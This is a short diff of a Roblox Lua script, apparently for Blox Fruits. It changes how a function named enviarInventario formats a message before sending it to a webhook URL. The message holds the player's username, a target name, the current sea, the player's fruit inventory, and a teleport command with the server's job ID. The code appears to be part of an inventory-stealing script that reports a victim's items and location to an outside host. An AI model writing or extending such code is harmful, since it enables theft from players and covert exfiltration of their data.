@@ -232,10 +232,10 @@ local function enviarInventario()
     end
 
     local seaAtual = detectarSea()
-    local teleportCommand = string.format("lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n", placeId, jobId)
+    local teleportCommand = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n```", placeId, jobId)
     
-    local infoBlock = string.format("\nUsername: %s\nYou: %s\nSea: %s\n", LocalPlayer.Name, targetPlayerName, seaAtual)
-    local inventoryBlock = string.format("\n%s", fruitsList)
+    local infoBlock = string.format("```\nUsername: %s\nYou: %s\nSea: %s\n```", LocalPlayer.Name, targetPlayerName, seaAtual)
+    local inventoryBlock = string.format("```\n%s```", fruitsList)
     
     local requestData = {
         Url = webhookURL,
